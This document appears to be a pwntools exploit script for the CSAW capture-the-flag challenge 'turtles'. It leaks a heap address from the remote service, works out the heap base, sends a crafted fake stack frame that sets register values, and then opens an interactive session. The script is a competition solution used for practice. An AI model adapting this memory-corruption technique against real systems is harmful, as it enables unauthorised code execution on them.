from pwn import *

s = remote('pwn.chal.csaw.io', 9003)

# env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libcrypto.so.1.0.0")}
# s = process('./turtles', env=env)

raw_input('...')

# leak heap base
heap_offset = 0x67fa40 - 0x602000
heap_leak = int(s.recvline().split('\n')[0].split(' ')[-1][2:], 16)
heap_base = heap_leak - heap_offset

s.info('HEAP: ' + hex(heap_base))

# setup fake stack frame
input_offset = 0x67fa40 - 0x602000

b = heap_base + input_offset

dat = ''
dat += p64(b + 0x8) # rbp
dat += p64(b + 0x80 - 0x40) # r8
dat += 'b'*8
dat += 'c'*8
dat += 'd'*8
dat += 'e'*8
dat += 'f'*8
dat += 'g'*8
dat += 'h'*8
dat += p64(b + 0x50) # rdx
dat += '0'*8
dat += p64(b + 0x60)
dat += p64(0) # first rax
dat += '3'*8
dat += '4'*8
dat += p64(0)
dat += p64(b + 0x80) # rdi
dat += p64(b + 0x90)
dat += '6'*8 # rax
dat += '7'*8
dat += '8'*8
dat += p64(0)

s.sendline(dat)

s.interactive()
